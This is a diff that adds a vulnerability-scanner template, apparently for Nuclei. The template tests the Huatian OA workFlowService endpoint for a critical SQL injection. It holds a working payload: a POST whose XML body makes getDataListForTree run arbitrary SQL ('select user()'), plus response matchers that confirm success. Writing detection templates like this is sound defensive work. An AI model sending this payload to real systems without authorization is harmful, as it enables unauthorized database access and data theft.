@@ -1,0 +1,29 @@
+id: huatianOA-workFlowService-sql
+
+info:
+  name: huatianOA-workFlowService-sql
+  author: Co5mos
+  severity: critical
+  description: 检测华天OA系统workFlowService接口存在的SQL注入漏洞
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/OAapp/bfapp/buffalo/workFlowService"
+    
+    body: "<buffalo-call> <method>getDataListForTree</method> <string>select user()</string> </buffalo-call>"
+    headers:
+      Content-Type: text/xml  # 添加合适的Content-Type头，帮助服务器正确解析请求
+
+    matchers-condition: and
+    matchers:
+      - type: regex  # 改为regex类型匹配器，与regex字段匹配
+        part: body
+        regex:
+          - "java.util.HashMap"
+          - "oa@"
+        condition: or  # 两个正则表达式满足一个即可
+
+      - type: status
+        status:
+          - 200
